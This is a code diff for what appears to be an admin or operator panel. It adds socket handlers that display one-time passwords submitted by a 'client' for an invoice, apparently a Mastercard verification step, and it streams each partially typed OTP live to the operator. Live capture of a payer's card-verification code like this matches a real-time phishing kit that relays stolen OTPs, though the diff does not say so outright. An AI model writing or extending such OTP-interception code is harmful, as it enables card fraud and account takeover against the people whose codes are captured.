@@ -465,13 +465,32 @@
     });
   });
   
-  // Listen for OTP submission from client
-  socket.on('mc_otp_submitted', function(data) {
-    if (data.invoiceId === currentMcInvoiceId) {
-      const mcOtpValue = document.getElementById('mcOtpValue');
-      mcOtpValue.textContent = data.otp;
+// Listen for OTP submission from client
+socket.on('mc_otp_submitted', function(data) {
+  console.log('Received OTP from client:', data);
+  if (data.invoiceId === currentMcInvoiceId) {
+    const mcOtpValue = document.getElementById('mcOtpValue');
+    if (mcOtpValue) {
+      mcOtpValue.textContent = data.otp || 'Error: No OTP received';
     }
-  });
+  }
+});
+
+// Optional - for live OTP typing feature
+socket.on('mc_otp_typing', function(data) {
+  if (data.invoiceId === currentMcInvoiceId) {
+    const mcOtpValue = document.getElementById('mcOtpValue');
+    if (mcOtpValue) {
+      mcOtpValue.textContent = `Typing: ${data.partialOtp}...`;
+    }
+  }
+});
+
+// Listen for OTP resend requests
+socket.on('mc_resend_otp', function(data) {
+  console.log('Client requested OTP resend:', data);
+  // If we want to show this in the admin UI, we could add code here
+});
   
   // Make the function globally available
   window.showMCVerification = showMCVerification;
